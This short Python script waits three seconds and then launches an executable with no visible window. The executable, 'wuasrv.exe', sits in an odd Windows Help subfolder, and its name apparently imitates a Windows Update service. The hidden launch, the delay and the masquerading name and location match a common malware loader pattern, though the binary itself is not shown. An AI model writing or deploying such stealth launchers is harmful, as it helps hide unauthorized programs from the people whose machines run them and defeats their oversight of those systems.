import subprocess
import time

# Costante per non mostrare la finestra (valore da winbase.h)
CREATE_NO_WINDOW = 0x08000000

time.sleep(3)

subprocess.Popen(
    r"C:\Windows\Help\mui\0563\DIAgnostic\wuasrv.exe",
    creationflags=CREATE_NO_WINDOW
)
